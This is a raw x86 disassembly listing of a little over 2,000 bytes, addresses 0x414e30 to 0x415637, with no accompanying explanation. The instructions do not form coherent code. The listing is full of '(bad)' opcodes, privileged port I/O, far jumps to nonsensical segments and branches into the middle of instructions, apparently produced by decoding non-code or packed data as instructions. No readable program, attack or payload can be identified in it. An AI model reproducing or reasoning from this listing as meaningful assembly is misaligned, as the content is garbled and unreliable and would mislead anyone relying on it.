  414e30:	adc    al,0x0
  414e32:	cld    
  414e33:	pop    ebx
  414e34:	mov    ebp,0xfc960865
  414e39:	imul   eax,DWORD PTR [ebx-0x46dce447],0x37b8f0df
  414e43:	mov    bh,0xe1
  414e45:	test   eax,0xc70b4cd
  414e4a:	xchg   BYTE PTR [ebp+0x3e682b63],bh
  414e50:	sbb    edi,DWORD PTR [esi]
  414e52:	pop    ecx
  414e53:	and    bh,dl
  414e55:	aas    
  414e56:	xchg   edx,eax
  414e57:	inc    esp
  414e58:	add    esp,ebx
  414e5a:	mov    dl,BYTE PTR [ebx+0xd7e6369]
  414e60:	(bad)  
  414e61:	cmp    DWORD PTR [eax-0x490b2c50],eax
  414e67:	fiadd  DWORD PTR [edx-0x49a3b475]
  414e6d:	push   esi
  414e6e:	adc    al,0xbf
  414e70:	push   es
  414e71:	lds    edi,FWORD PTR [edi-0x77]
  414e74:	ss dec esp
  414e76:	cmc    
  414e77:	rol    BYTE PTR [ebx-0x6b],cl
  414e7a:	sbb    BYTE PTR [eax],cl
  414e7c:	push   0xffffff8d
  414e7e:	xchg   edx,eax
  414e7f:	cmc    
  414e80:	es (bad) 
  414e82:	jmp    0x414e51
  414e84:	or     al,0x0
  414e86:	mov    edi,0xdcd804af
  414e8b:	mov    bl,0x18
  414e8d:	test   edx,esi
  414e8f:	btr    DWORD PTR [ebp-0x5b2a38ce],ebx
  414e96:	ret    
  414e97:	addr16 pop ss
  414e99:	mov    bl,0x2
  414e9b:	in     eax,dx
  414e9c:	fs mov ch,0x97
  414e9f:	cmp    bl,dl
  414ea1:	push   0x39ad45bb
  414ea6:	add    esp,ecx
  414ea8:	sbb    bh,al
  414eaa:	mov    ds:0xf5825382,al
  414eaf:	ss and eax,0x1f16545
  414eb5:	push   cs
  414eb6:	ret    0x6ef4
  414eb9:	jle    0x414eb6
  414ebb:	push   esi
  414ebc:	push   0x21
  414ebe:	push   edi
  414ebf:	ds in  eax,dx
  414ec1:	jmp    0x68bbe0a1
  414ec6:	scas   al,BYTE PTR es:[edi]
  414ec7:	je     0x414e71
  414ec9:	inc    ebx
  414eca:	mov    esi,0x34279d75
  414ecf:	add    al,0x5f
  414ed1:	mov    eax,ds:0x1972f637
  414ed6:	push   0xec8dd34d
  414edb:	dec    ecx
  414edc:	gs aad 0xb9
  414edf:	mov    al,ds:0xa244c3df
  414ee4:	or     eax,0x89d60b81
  414ee9:	push   eax
  414eea:	adc    bl,BYTE PTR [esi+0x1a]
  414eed:	and    ebp,DWORD PTR [ecx+0xdf1f191]
  414ef3:	xlat   BYTE PTR ds:[ebx]
  414ef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ef5:	stc    
  414ef6:	add    eax,DWORD PTR [edx+0x51]
  414ef9:	push   cs
  414efa:	and    al,0xd8
  414efc:	mov    al,0xae
  414efe:	push   edx
  414eff:	mov    ecx,DWORD PTR [edi]
  414f01:	jbe    0x414f61
  414f03:	dec    ebx
  414f04:	jmp    0x1aea:0x8466e402
  414f0b:	pop    ebx
  414f0c:	pop    esp
  414f0d:	or     edi,DWORD PTR [ecx+edi*4+0x6e]
  414f11:	into   
  414f12:	xor    ebp,ebx
  414f14:	ss push es
  414f16:	lods   al,BYTE PTR ds:[esi]
  414f17:	aam    0x2a
  414f19:	scas   eax,DWORD PTR es:[edi]
  414f1a:	ret    
  414f1b:	neg    DWORD PTR [eax]
  414f1d:	sbb    BYTE PTR [eax+0x2a9b6c50],ch
  414f23:	stos   BYTE PTR es:[edi],al
  414f24:	outs   dx,BYTE PTR ds:[esi]
  414f25:	dec    ebp
  414f26:	cli    
  414f27:	or     eax,0x6815bb76
  414f2c:	mov    dl,0xe2
  414f2e:	loop   0x414f2a
  414f30:	sub    al,0xab
  414f32:	mov    edx,0x86574e70
  414f37:	xchg   edx,eax
  414f38:	xchg   ecx,eax
  414f39:	nop    DWORD PTR gs:[ebx-0x7f]
  414f3e:	ds clc 
  414f40:	loopne 0x414f93
  414f42:	push   edx
  414f43:	shl    al,1
  414f45:	inc    esp
  414f46:	xor    ebx,DWORD PTR [ecx]
  414f48:	stos   DWORD PTR es:[edi],eax
  414f49:	push   ecx
  414f4a:	mov    edi,0xa71fb927
  414f4f:	adc    bl,ah
  414f51:	mov    edi,0x8ab72626
  414f56:	(bad)  
  414f57:	jl     0x414faf
  414f59:	icebp  
  414f5a:	shr    ebx,cl
  414f5c:	std    
  414f5d:	or     eax,DWORD PTR [ebx+0x7f]
  414f60:	loop   0x414f16
  414f62:	mov    esp,0x31793707
  414f67:	adc    bl,bl
  414f69:	mov    ebp,DWORD PTR [esi-0x1ede4e01]
  414f6f:	cmc    
  414f70:	xchg   edx,eax
  414f71:	cwde   
  414f72:	mov    edi,0x6d947902
  414f77:	cmp    eax,0xf8d879f5
  414f7c:	xor    eax,0x67d7b243
  414f81:	ss dec edx
  414f83:	ror    DWORD PTR [esi+0x5fee5de0],cl
  414f89:	adc    edx,ebp
  414f8b:	cmp    BYTE PTR [edi-0x14],al
  414f8e:	test   DWORD PTR [ecx],edi
  414f90:	iret   
  414f91:	iret   
  414f92:	add    ebx,eax
  414f94:	mov    ds:0xfa2f687e,al
  414f99:	jmp    0x414f69
  414f9b:	and    BYTE PTR [ecx-0x8ad052b],0x3e
  414fa2:	cmp    DWORD PTR [esi],edi
  414fa4:	outs   dx,DWORD PTR ds:[esi]
  414fa5:	mov    ebx,DWORD PTR [edi+0x6b]
  414fa8:	pop    eax
  414fa9:	push   eax
  414faa:	icebp  
  414fab:	fld    TBYTE PTR [ebp-0x35]
  414fae:	rcr    ebp,cl
  414fb0:	ins    BYTE PTR es:[edi],dx
  414fb1:	jg     0x414f5a
  414fb3:	imul   esi,DWORD PTR [edx-0x43],0x7918a2a5
  414fba:	ss das 
  414fbc:	jns    0x41500c
  414fbe:	mov    dl,0xcc
  414fc0:	add    eax,0x5bc6d9e2
  414fc5:	ins    BYTE PTR es:[edi],dx
  414fc6:	adc    esp,edx
  414fc8:	sub    DWORD PTR [edi+0x2a623c08],eax
  414fce:	and    al,0xac
  414fd0:	mov    cl,dl
  414fd2:	push   edi
  414fd3:	or     BYTE PTR [edi],bh
  414fd5:	jecxz  0x414fe7
  414fd7:	or     ah,BYTE PTR [eax+0x7cb260c7]
  414fdd:	mov    ecx,0xbec84845
  414fe2:	stc    
  414fe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fe4:	dec    edi
  414fe5:	out    dx,al
  414fe6:	push   ebx
  414fe7:	sbb    BYTE PTR [eax-0x3],0x23
  414feb:	repz mul DWORD PTR [edx+esi*8-0x5e91cc]
  414ff3:	cld    
  414ff4:	aaa    
  414ff5:	ins    DWORD PTR es:[edi],dx
  414ff6:	ja     0x414f8f
  414ff8:	ss inc eax
  414ffa:	imul   ebx,DWORD PTR es:[edi],0xffffffbf
  414ffe:	or     edi,ecx
  415000:	xor    BYTE PTR [ebx-0x41e9ed24],al
  415006:	lahf   
  415007:	sbb    BYTE PTR [ecx],0xdd
  41500a:	mov    bh,0x94
  41500c:	fstp   DWORD PTR [ebp+0x43]
  41500f:	inc    ebp
  415010:	iret   
  415011:	add    DWORD PTR [edi+0x53],0xa036824a
  415018:	push   eax
  415019:	(bad)  
  41501a:	mov    ebx,0xeb5891b1
  41501f:	out    dx,eax
  415020:	jae    0x415015
  415022:	push   0x82629e37
  415027:	rcr    DWORD PTR [edi-0x6c],cl
  41502a:	jecxz  0x41507c
  41502c:	xor    dl,cl
  41502e:	add    BYTE PTR [esi+0x734a9974],ch
  415034:	and    BYTE PTR [esi],cl
  415036:	(bad)  
  415038:	(bad)  
  415039:	in     al,0xd8
  41503b:	sbb    eax,ebx
  41503d:	push   eax
  41503e:	dec    esp
  41503f:	add    al,0x47
  415041:	mov    cl,BYTE PTR [ecx-0x4fa0d56b]
  415047:	std    
  415048:	mov    edx,0x42361e03
  41504d:	pop    edx
  41504e:	repz pop edi
  415050:	enter  0x8fca,0x5f
  415054:	cmp    dh,BYTE PTR [esi+0x7bc1242]
  41505a:	loope  0x414fff
  41505c:	xchg   ebx,eax
  41505d:	dec    eax
  41505e:	jbe    0x415051
  415060:	fidivr WORD PTR [ecx+eiz*8-0x5e85a572]
  415067:	test   eax,0x8c2db88b
  41506c:	div    bh
  41506e:	pop    ecx
  41506f:	cdq    
  415070:	push   0x1d
  415072:	fisubr WORD PTR ds:0xa85ee49f
  415078:	ja     0x41501b
  41507a:	sub    BYTE PTR [esi],cl
  41507c:	mov    al,ds:0x1b658391
  415081:	inc    ebx
  415082:	je     0x415095
  415084:	push   esi
  415085:	repnz mov WORD PTR [esi-0x13],gs
  415089:	jp     0x4150bb
  41508b:	adc    BYTE PTR [esi*2-0x4c763f50],ah
  415092:	test   eax,0xe4214d28
  415097:	sub    BYTE PTR [edi],al
  415099:	jp     0x4150d9
  41509b:	lods   eax,DWORD PTR ds:[esi]
  41509c:	(bad)  
  41509e:	sbb    bh,BYTE PTR [ebp-0x3a]
  4150a1:	add    BYTE PTR [eax+0x6f],cl
  4150a4:	push   esi
  4150a5:	jnp    0x415088
  4150a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150a8:	sbb    DWORD PTR [edx],0x1a43d1f8
  4150ae:	jle    0x4150ea
  4150b0:	mov    eax,ds:0xaa680b8
  4150b5:	ja     0x41512a
  4150b7:	pop    esi
  4150b8:	lock cmps DWORD PTR ds:[si],DWORD PTR es:[di]
  4150bb:	inc    ecx
  4150bc:	push   esi
  4150bd:	mov    ch,0xb
  4150bf:	shl    DWORD PTR ds:0x9f014547,1
  4150c5:	fild   QWORD PTR [esi]
  4150c7:	cmp    al,0xe7
  4150c9:	(bad)  
  4150ca:	jp     0x4150c7
  4150cc:	aaa    
  4150cd:	ret    0xa583
  4150d0:	and    BYTE PTR [esi+0x4],ah
  4150d3:	cmc    
  4150d4:	cmc    
  4150d5:	jmp    0x41507d
  4150d7:	repz mov ah,0x10
  4150da:	fwait
  4150db:	cmp    dh,BYTE PTR [esi+0x483c6a72]
  4150e1:	(bad)  
  4150e2:	idiv   DWORD PTR [ecx+eiz*2+0x3893a16a]
  4150e9:	and    al,0x10
  4150eb:	inc    ecx
  4150ec:	cld    
  4150ed:	fs mov ah,0x5a
  4150f0:	xor    edi,DWORD PTR [ecx]
  4150f2:	sub    ah,BYTE PTR [edx+ecx*2]
  4150f5:	sbb    bl,dh
  4150f7:	test   al,ah
  4150f9:	push   ds
  4150fa:	std    
  4150fb:	xchg   ebx,eax
  4150fc:	shl    al,cl
  4150fe:	test   eax,0xf397bff6
  415103:	or     DWORD PTR [edx],edx
  415105:	sbb    eax,0x978ff0af
  41510a:	sub    eax,0xe9c26e4
  41510f:	aam    0xa0
  415111:	xchg   BYTE PTR [edi],dl
  415113:	jmp    0x24dd:0x148187c2
  41511a:	(bad)  
  41511b:	fld    DWORD PTR [ebx+0x30b1837e]
  415121:	dec    eax
  415122:	jmp    0xa1b490d8
  415127:	and    dl,al
  415129:	out    dx,eax
  41512a:	daa    
  41512b:	loopne 0x4150f5
  41512d:	test   ch,ah
  41512f:	gs push edi
  415131:	outs   dx,BYTE PTR ds:[esi]
  415132:	sahf   
  415133:	mov    esi,ebx
  415135:	or     esp,DWORD PTR [ebp-0x53fd47f9]
  41513b:	push   esi
  41513c:	pop    edi
  41513d:	push   ds
  41513e:	ret    
  41513f:	cwde   
  415140:	stos   DWORD PTR es:[edi],eax
  415141:	mov    DWORD PTR [ecx-0x10177a10],eax
  415147:	sbb    al,0x42
  415149:	outs   dx,DWORD PTR ds:[esi]
  41514a:	inc    esi
  41514b:	cdq    
  41514c:	xor    DWORD PTR [esi-0x67405950],ecx
  415152:	ja     0x4151b5
  415154:	enter  0xb7,0xb1
  415158:	lods   eax,DWORD PTR ds:[esi]
  415159:	sub    eax,0x69ea3e81
  41515e:	xchg   esi,eax
  41515f:	jno    0x415160
  415161:	xchg   DWORD PTR [esi-0x75],esi
  415164:	mov    cl,0x40
  415166:	xchg   DWORD PTR ds:0x3f23d5e3,edi
  41516c:	add    BYTE PTR [edi-0x40],bh
  41516f:	mov    DWORD PTR [eax],ecx
  415171:	jo     0x41514e
  415173:	pop    ebx
  415174:	dec    eax
  415175:	pop    ss
  415176:	jmp    0x8edd86b1
  41517b:	sbb    DWORD PTR [edx-0x680ab264],edx
  415181:	xor    al,0x3e
  415183:	and    BYTE PTR [eax-0x7d9e1fc5],bl
  415189:	fsub   DWORD PTR [esi-0x405bbd85]
  41518f:	jns    0x4151e8
  415191:	mov    al,0x10
  415193:	les    ebx,FWORD PTR [ebp-0x2c50c60a]
  415199:	scas   eax,DWORD PTR es:[edi]
  41519a:	and    DWORD PTR [edi+0x1c],eax
  41519d:	pop    edi
  41519e:	sar    DWORD PTR [edi-0x9221545],cl
  4151a4:	sub    eax,0x6b4cf08e
  4151a9:	pop    es
  4151aa:	jmp    0x458a4898
  4151af:	cwde   
  4151b0:	lds    ebp,FWORD PTR [eax]
  4151b2:	xchg   edi,eax
  4151b3:	mov    ss,WORD PTR [ebx-0x7bee9aea]
  4151b9:	rcr    BYTE PTR ds:0x4e8226c6,0x39
  4151c0:	js     0x415192
  4151c2:	pusha  
  4151c3:	retf   0x7764
  4151c6:	aas    
  4151c7:	dec    esp
  4151c8:	test   al,0xfc
  4151ca:	inc    esp
  4151cb:	fwait
  4151cc:	push   es
  4151cd:	loop   0x41522e
  4151cf:	fist   WORD PTR [ebp-0x72]
  4151d2:	mov    al,0xd7
  4151d4:	add    al,al
  4151d6:	js     0x41523b
  4151d8:	fadd   st(3),st
  4151da:	retf   
  4151db:	fbld   TBYTE PTR [ecx+0xa]
  4151de:	xchg   edx,eax
  4151df:	into   
  4151e0:	clc    
  4151e1:	push   0x3e862d0
  4151e6:	call   0x59a9:0x430504d8
  4151ed:	ret    
  4151ee:	inc    edx
  4151ef:	(bad)  
  4151f0:	jmp    0x2108:0xc805a458
  4151f7:	adc    eax,0x1a486405
  4151fc:	push   eax
  4151fd:	sub    eax,0xe2780a37
  415202:	or     BYTE PTR [edx],dh
  415204:	inc    ecx
  415205:	in     eax,dx
  415206:	or     DWORD PTR [esi],esp
  415208:	scas   eax,DWORD PTR es:[edi]
  415209:	xchg   ebx,eax
  41520a:	ret    
  41520b:	out    dx,al
  41520c:	mov    ds:0xa0072c26,al
  415211:	pop    ds
  415212:	cld    
  415213:	adc    dh,BYTE PTR [esi-0x66]
  415216:	sub    BYTE PTR [eax],ch
  415218:	push   ds
  415219:	cmc    
  41521a:	push   cs
  41521b:	js     0x41524c
  41521d:	dec    ebp
  41521e:	sbb    al,0xde
  415220:	ss in  al,0x79
  415223:	xor    bh,BYTE PTR [eax]
  415225:	push   ebx
  415226:	fsub   DWORD PTR [edi]
  415228:	jno    0x41525a
  41522a:	xor    ecx,edx
  41522c:	sti    
  41522d:	xchg   edx,eax
  41522e:	mov    cl,0xc8
  415230:	xor    DWORD PTR [ebx-0x7811dc5a],esp
  415236:	imul   ebx,esp,0xffffffd8
  415239:	test   eax,0xdfe09969
  41523e:	sub    ecx,esi
  415240:	or     eax,0x3002b60f
  415245:	and    ecx,DWORD PTR [eax-0x118f6ba3]
  41524b:	push   0xbb0e5779
  415250:	mov    ebx,0xda35565a
  415255:	fidivr DWORD PTR [esi+edx*2+0x75712d40]
  41525c:	xchg   ebx,eax
  41525d:	daa    
  41525e:	xchg   DWORD PTR gs:[ebx-0x7a],esp
  415262:	mov    ebp,0x83b2701
  415267:	dec    ecx
  415268:	fs push ebx
  41526a:	sbb    cl,cl
  41526c:	mov    ch,0x6
  41526e:	ja     0x415251
  415270:	mov    bh,0xe4
  415272:	fmulp  st(6),st
  415274:	sbb    ah,BYTE PTR [esi+ebp*4]
  415277:	pop    ss
  415278:	add    eax,0x9ca518ca
  41527d:	lods   al,BYTE PTR ds:[esi]
  41527e:	and    al,0x4c
  415280:	inc    esi
  415281:	inc    edi
  415282:	into   
  415283:	ja     0x415246
  415285:	jnp    0x4152d4
  415287:	retf   0xcbd6
  41528a:	call   0x4076:0x57f36c15
  415291:	fisttp QWORD PTR [esp+eax*2-0x4a8f9aaf]
  415298:	in     al,dx
  415299:	aam    0x9d
  41529b:	ds xchg ebp,eax
  41529d:	(bad)  
  41529e:	retf   0x14dd
  4152a1:	ja     0x415321
  4152a3:	cwde   
  4152a4:	and    eax,0x4fb854de
  4152a9:	sbb    DWORD PTR [ecx-0x1f],edx
  4152ac:	pop    ebp
  4152ad:	cmp    BYTE PTR [ecx+0x52],0xf9
  4152b1:	(bad)  [ecx]
  4152b3:	mov    esp,DWORD PTR [eax-0x5ec5336c]
  4152b9:	ins    BYTE PTR es:[edi],dx
  4152ba:	mov    dh,0xe6
  4152bc:	in     al,dx
  4152bd:	repnz adc al,0x85
  4152c0:	or     ebp,DWORD PTR [eax-0x7b]
  4152c3:	in     al,dx
  4152c4:	ret    0xbef8
  4152c7:	and    edi,esi
  4152c9:	xchg   edi,eax
  4152ca:	fld    QWORD PTR [edx]
  4152cc:	push   ebp
  4152cd:	(bad)  
  4152ce:	frstor [eax-0x73]
  4152d1:	jl     0x415262
  4152d3:	mov    BYTE PTR [eax],ch
  4152d5:	shl    BYTE PTR [eax],1
  4152d7:	pop    es
  4152d8:	rol    DWORD PTR [eax-0x5e],1
  4152db:	mov    ch,0x55
  4152dd:	push   0x71a315f1
  4152e2:	inc    ecx
  4152e3:	adc    BYTE PTR [ebx],0x96
  4152e6:	daa    
  4152e7:	mov    WORD PTR fs:0x7d67e041,gs
  4152ee:	push   ss
  4152ef:	xchg   BYTE PTR [ecx],dh
  4152f1:	or     BYTE PTR ds:0x556d0022,ah
  4152f7:	ret    0xc8be
  4152fa:	mov    ds:0xa1f9858a,eax
  4152ff:	jmp    0x41524bb6
  415304:	add    al,0x20
  415306:	or     eax,0xf8458f9c
  41530b:	leave  
  41530c:	dec    ecx
  41530d:	jns    0x4152ca
  41530f:	(bad)  
  415310:	les    ecx,FWORD PTR [ecx+ebp*8]
  415313:	sub    esi,DWORD PTR [edx+0x76]
  415316:	cs das 
  415318:	dec    esi
  415319:	cmc    
  41531a:	cmc    
  41531b:	(bad)  
  41531d:	leave  
  41531e:	outs   dx,DWORD PTR ds:[esi]
  41531f:	ds mov ebp,0xbbeb4200
  415325:	add    ah,ah
  415327:	sti    
  415328:	mov    esp,DWORD PTR ss:[eax]
  41532b:	and    esi,DWORD PTR [eax+0x38806f5c]
  415331:	mov    ebp,0x75239f23
  415336:	mov    ds:0xa3359a5f,al
  41533b:	push   ebp
  41533c:	dec    edx
  41533d:	sub    edi,DWORD PTR [esi+0x7223ffe8]
  415343:	jmp    0x4d0f86b1
  415348:	clc    
  415349:	mov    dh,BYTE PTR ss:[eax]
  41534c:	dec    ebx
  41534d:	ins    DWORD PTR es:[edi],dx
  41534e:	xor    ch,0x4f
  415351:	inc    ebx
  415352:	hlt    
  415353:	sti    
  415354:	pop    es
  415355:	jl     0x4153cb
  415357:	cmp    esi,esi
  415359:	pop    edi
  41535a:	dec    ebx
  41535b:	xchg   edx,eax
  41535c:	clc    
  41535d:	ffreep st(1)
  41535f:	mov    esp,0xfafa06e5
  415364:	les    ebp,FWORD PTR [ecx-0x1a]
  415367:	jg     0x41531e
  415369:	mov    ds:0xfef1d7b,eax
  41536e:	loopne 0x415351
  415370:	add    al,0xfc
  415372:	das    
  415373:	fnstsw WORD PTR [ebp+0x6e]
  415376:	jae    0x4153b5
  415378:	mov    esp,0x10e148b4
  41537d:	imul   esi,DWORD PTR [ebx],0xfffffff8
  415380:	pop    es
  415381:	xchg   edx,eax
  415382:	jne    0x4153ac
  415384:	jle    0x41537c
  415386:	jno    0x415359
  415388:	dec    eax
  415389:	fsubr  st(0),st
  41538b:	and    eax,DWORD PTR [esi-0x54]
  41538e:	loope  0x4153a6
  415390:	int3   
  415391:	call   0x634a:0x90af930b
  415398:	pop    ebx
  415399:	out    dx,al
  41539a:	popa   
  41539b:	in     eax,0x98
  41539d:	adc    BYTE PTR [esp+eiz*2+0x60],ch
  4153a1:	aaa    
  4153a2:	enter  0xe8b1,0xc
  4153a6:	pop    ebx
  4153a7:	int3   
  4153a8:	sub    eax,0xdf2ab2f7
  4153ad:	sbb    ah,0x30
  4153b0:	repz imul edi,DWORD PTR ds:[edx+0x74b61dc5],0x410ee3f
  4153bc:	jb     0x415415
  4153be:	nop
  4153bf:	sbb    DWORD PTR [esi+esi*4],edx
  4153c2:	arpl   WORD PTR [ebp+0x6c],dx
  4153c5:	xor    al,0xee
  4153c7:	in     eax,dx
  4153c8:	mov    bh,0x5e
  4153ca:	or     al,0x4f
  4153cc:	cld    
  4153cd:	push   cs
  4153ce:	ss ins DWORD PTR es:[edi],dx
  4153d0:	or     bh,BYTE PTR [ebx+0xb]
  4153d3:	dec    ebx
  4153d4:	or     ecx,ecx
  4153d6:	icebp  
  4153d7:	mov    al,ds:0x96be9fce
  4153dc:	es out 0x2f,al
  4153df:	jb     0x415365
  4153e1:	mov    edi,0x8a4c5132
  4153e6:	out    dx,al
  4153e7:	push   ebp
  4153e8:	call   0xe531:0x592a7085
  4153ef:	loop   0x41540c
  4153f1:	aam    0xc
  4153f3:	inc    edi
  4153f4:	sbb    ah,BYTE PTR [ebx-0x7ea485f3]
  4153fa:	jl     0x4153c2
  4153fc:	sub    edi,DWORD PTR [edi+0x1a]
  4153ff:	std    
  415400:	cld    
  415401:	xchg   ecx,eax
  415402:	pop    ss
  415403:	adc    eax,0x1bc677ac
  415408:	jne    0x415428
  41540a:	cmp    al,0xd3
  41540c:	mov    ah,0x84
  41540e:	fdivr  QWORD PTR [esi+0x307cbc3a]
  415414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415415:	and    DWORD PTR [edx-0x63],ebx
  415418:	repnz push ds
  41541a:	adc    al,bh
  41541c:	xlat   BYTE PTR ds:[ebx]
  41541d:	idiv   BYTE PTR [ecx-0x25]
  415420:	into   
  415421:	das    
  415422:	mov    gs,WORD PTR [ebp-0x2c]
  415425:	lods   eax,DWORD PTR ds:[esi]
  415426:	ss push cs
  415428:	(bad)  
  415429:	xchg   edx,eax
  41542a:	dec    ebx
  41542b:	and    esi,DWORD PTR [ecx]
  41542d:	and    al,0x91
  41542f:	je     0x415407
  415431:	sbb    DWORD PTR [esi+0x62],0xffffff92
  415435:	jne    0x415472
  415437:	lock xchg ebp,eax
  415439:	add    ebx,DWORD PTR [edi+0x6c68edd4]
  41543f:	adc    edx,DWORD PTR [ebp-0x3ae60c32]
  415445:	xor    al,0x36
  415447:	mov    ecx,0xb032b024
  41544c:	cmp    eax,0x4b5925a9
  415451:	out    dx,al
  415452:	pop    esi
  415453:	retf   0xe91f
  415456:	jge    0x4154c3
  415458:	mov    ebp,DWORD PTR [edi]
  41545a:	inc    edx
  41545b:	mov    gs,WORD PTR [edx+0x52]
  41545e:	push   0xb16b1501
  415463:	xchg   ebx,eax
  415464:	aam    0x92
  415466:	ds repnz daa 
  415469:	jmp    0x415479
  41546b:	shr    DWORD PTR [esp+edx*2-0x7],cl
  41546f:	mov    ch,0xdc
  415471:	test   DWORD PTR [esi-0x3c],edx
  415474:	or     al,0x4b
  415476:	push   ebx
  415477:	inc    edi
  415478:	es test ebp,eax
  41547b:	and    DWORD PTR [edi],0x32
  41547e:	mov    ch,0x90
  415480:	pop    esp
  415481:	mov    al,0x2f
  415483:	lods   al,BYTE PTR ds:[esi]
  415484:	iret   
  415485:	sti    
  415486:	jmp    0x4154d9
  415488:	outs   dx,BYTE PTR ds:[esi]
  415489:	imul   ah
  41548b:	ins    DWORD PTR es:[edi],dx
  41548c:	cmp    al,0x12
  41548e:	ins    BYTE PTR es:[edi],dx
  41548f:	and    cl,BYTE PTR ds:0x1d391d2c
  415495:	sbb    ebx,ebp
  415497:	and    esi,eax
  415499:	cs adc eax,0xcc261c02
  41549f:	rcr    ecx,cl
  4154a1:	adc    edx,DWORD PTR [edx]
  4154a3:	in     al,0x71
  4154a5:	sub    BYTE PTR ss:[ebx+0x1626ad2e],al
  4154ac:	and    al,0x39
  4154ae:	es mov ebx,0x5abc17b
  4154b4:	pop    esp
  4154b5:	push   ds
  4154b6:	outs   dx,BYTE PTR cs:[esi]
  4154b8:	pop    esp
  4154b9:	test   DWORD PTR [eax],esi
  4154bb:	mov    ecx,0xcc15baf2
  4154c0:	arpl   WORD PTR [ecx+0x27],bp
  4154c3:	jg     0x41553d
  4154c5:	jg     0x4154b4
  4154c7:	test   al,0x7c
  4154c9:	push   ds
  4154ca:	lods   al,BYTE PTR ds:[esi]
  4154cb:	cmp    al,0xf4
  4154cd:	push   ebp
  4154ce:	and    eax,0x29ab2088
  4154d3:	sub    dl,dh
  4154d5:	fsub   st(7),st
  4154d7:	or     dl,dh
  4154d9:	add    al,0x1c
  4154db:	popa   
  4154dc:	mov    eax,ds:0x119ca953
  4154e1:	xor    ecx,DWORD PTR [ebx+0x4b]
  4154e4:	scas   al,BYTE PTR es:[edi]
  4154e5:	cs pop es
  4154e7:	xchg   eax,ebx
  4154e9:	outs   dx,DWORD PTR ds:[esi]
  4154ea:	mov    dl,ch
  4154ec:	mov    dh,0x3
  4154ee:	dec    edx
  4154ef:	sbb    DWORD PTR [esp+ecx*8+0x3e],esp
  4154f3:	retf   
  4154f4:	nop
  4154f5:	retf   0x7ddc
  4154f8:	int3   
  4154f9:	arpl   di,di
  4154fb:	out    0xa3,eax
  4154fd:	sub    dl,al
  4154ff:	pushf  
  415500:	sbb    al,0xc6
  415502:	inc    esi
  415503:	pop    esi
  415504:	jmp    0x415487
  415506:	xlat   BYTE PTR ds:[ebx]
  415507:	pop    ds
  415508:	leave  
  415509:	pop    edi
  41550a:	sbb    ebp,ebp
  41550c:	cdq    
  41550d:	test   eax,0xd07315ca
  415512:	inc    edi
  415513:	xor    eax,0xfcd1d697
  415518:	shl    DWORD PTR [ecx],cl
  41551a:	inc    ebx
  41551b:	mov    ebp,0x49978e1f
  415520:	clc    
  415521:	aaa    
  415522:	adc    DWORD PTR [ebp+0x788be87f],0x3b
  415529:	shl    BYTE PTR [edx-0x5599fac0],cl
  41552f:	rcr    ah,cl
  415531:	xor    al,0x3d
  415533:	lds    esi,FWORD PTR [ebp+ebp*8+0x154b0c46]
  41553a:	mov    ch,0xad
  41553c:	mov    edi,0x98a7bdd
  415541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415542:	dec    esi
  415543:	div    BYTE PTR ds:0xf2c76cce
  415549:	mov    eax,ds:0xac80d4c7
  41554e:	push   edi
  41554f:	xor    BYTE PTR [edx+esi*1+0x59],0x4f
  415554:	mov    ds:0xd2cbb209,al
  415559:	mov    edi,0xad22dc18
  41555e:	jp     0x4154e1
  415560:	sbb    esp,DWORD PTR [ecx+0x5f]
  415563:	jno    0x4155af
  415565:	dec    ecx
  415566:	inc    esp
  415567:	repz fld DWORD PTR [edi+edi*1]
  41556b:	add    BYTE PTR [edi+edx*8+0x3ee6ee95],al
  415572:	push   0xffffff94
  415574:	dec    eax
  415575:	fistp  WORD PTR [ecx-0x610f8d3e]
  41557b:	sahf   
  41557c:	test   al,0x2
  41557e:	addr16 jo 0x415551
  415581:	push   edx
  415582:	sub    al,BYTE PTR [edi-0x35]
  415585:	sbb    BYTE PTR [eax+0x9],dh
  415588:	or     eax,0xbc74d6b1
  41558d:	addr16 je 0x41560d
  415590:	repnz popf 
  415592:	iret   
  415593:	ins    BYTE PTR es:[edi],dx
  415594:	ds ds push 0x8f83f5ef
  41559b:	jne    0x415611
  41559d:	test   DWORD PTR ds:0xf7946e14,0xa2718434
  4155a7:	xor    ecx,eax
  4155a9:	xchg   ebx,eax
  4155aa:	addr16 call 0xf41e:0x823fa5
  4155b2:	add    BYTE PTR [ecx],ch
  4155b4:	push   edx
  4155b5:	xchg   ebp,eax
  4155b6:	mov    edi,0xea861520
  4155bb:	pop    ecx
  4155bc:	xchg   esi,eax
  4155bd:	test   al,0xeb
  4155bf:	iret   
  4155c0:	icebp  
  4155c1:	das    
  4155c2:	shl    BYTE PTR [eax*1-0x782d2dd3],1
  4155c9:	dec    ebx
  4155ca:	and    al,0xe9
  4155cc:	and    BYTE PTR ds:0xd1ca2366,0x92
  4155d3:	shr    BYTE PTR [eax+0x6b],cl
  4155d6:	push   ebp
  4155d7:	dec    eax
  4155d8:	sbb    ch,BYTE PTR [esi]
  4155da:	sbb    DWORD PTR [ecx],ecx
  4155dc:	in     eax,dx
  4155dd:	outs   dx,BYTE PTR ds:[esi]
  4155de:	rcl    DWORD PTR [ebx],cl
  4155e0:	(bad)  
  4155e1:	bound  edx,QWORD PTR [edx+esi*1-0x66]
  4155e5:	and    dh,al
  4155e7:	mov    ecx,0xe2164526
  4155ec:	mov    esp,0xd5f33e99
  4155f1:	mov    ebp,0xaff75a24
  4155f6:	mov    edx,0x9ac90570
  4155fb:	js     0x41562c
  4155fd:	push   0xffffffa7
  4155ff:	les    eax,FWORD PTR [edi+0x79]
  415602:	pop    ebx
  415603:	xchg   esp,eax
  415604:	xor    al,0x9b
  415606:	cmp    al,BYTE PTR [esi+0x13]
  415609:	je     0x415647
  41560b:	loop   0x4155b9
  41560d:	pop    ebp
  41560e:	pusha  
  41560f:	retf   0xecbc
  415612:	fldenv [eax-0xc]
  415615:	mov    ebx,0x8a989b7f
  41561a:	shl    BYTE PTR [ebp+ebp*1+0x33cefa4f],1
  415621:	stc    
  415622:	jecxz  0x415676
  415624:	jmp    0x8f50:0xff75637c
  41562b:	inc    esp
  41562c:	dec    esp
  41562d:	xlat   BYTE PTR ds:[ebx]
  41562e:	daa    
  41562f:	cmp    eax,0xee29806c
  415634:	mul    cl
  415636:	stos   DWORD PTR es:[edi],eax
  415637:	pop    esi
